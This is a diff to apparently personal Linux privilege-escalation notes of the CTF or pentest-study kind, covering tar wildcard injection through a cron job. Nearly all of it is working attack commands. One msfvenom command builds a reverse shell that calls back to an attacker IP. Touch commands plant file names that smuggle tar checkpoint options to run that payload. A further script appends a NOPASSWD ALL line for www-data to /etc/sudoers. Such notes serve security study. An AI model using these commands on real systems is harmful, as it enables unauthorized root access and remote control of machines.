@@ -48,5 +48,20 @@ chmod +xs /tmp/rootbash
 - Let us say that the tar command is being used to compress files, and especially if there is a wildcard entry * then you can create files inside the directory which is supposed to be compressed & inject your payloads through to the tar file
 - First generate the payload using msfvenom - `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.18.112.115 LPORT=4444 -f elf -o shell.elf`
 - Ship `shell.elf` to the target machine & do a `chmod +x shell.elf`
-- Create a couple of files with touch as follows - `touch --checkpoint=1;touch --checkpoint-action-exec=shell.elf;`
+- Create a couple of files with touch as follows - `touch --checkpoint=1;touch --checkpoint-action=exec=shell.elf;`
 - now let the cronjob run & you create a listener on your attacking machine & you will nicely get a reverse stageless shell.
+
+
+- We can also do something like this
+
+```
+echo 'echo "www-data ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > sudo.sh
+touch "/var/www/html/--checkpoint-action=exec=sh sudo.sh"
+touch "/var/www/html/--checkpoint=1"
+
+
+After the cronjob executes, it must have executed that script, giving ourselves the sudo access
+
+```
+
+
